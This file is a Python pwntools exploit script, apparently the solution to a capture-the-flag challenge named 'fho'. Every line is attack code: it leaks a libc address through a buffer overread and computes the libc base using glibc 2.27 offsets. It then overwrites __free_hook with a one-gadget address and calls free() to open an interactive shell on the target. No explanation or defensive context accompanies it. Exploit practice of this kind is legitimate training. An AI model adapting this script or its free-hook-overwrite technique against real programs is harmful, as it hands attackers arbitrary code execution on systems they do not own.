#!/usr/bin/python3
# Name: fho.py

from pwn import *

p = process("./fho")
e = ELF("./fho")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

buf = b"A" * 0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_start_main_hook = u64(p.recvline()[:-1] + b"\x00" * 2)
libc_base = libc_start_main_hook - (libc.symbols["__libc_start_main"] + 231)
free_hook = libc_base + libc.symbols["__free_hook"]
og = libc_base + 0x4f302

slog("libc base", libc_base)
slog("free hook", free_hook)

p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(og))

p.recvuntil("To free: ")
p.sendline(str(0x31337))

p.interactive()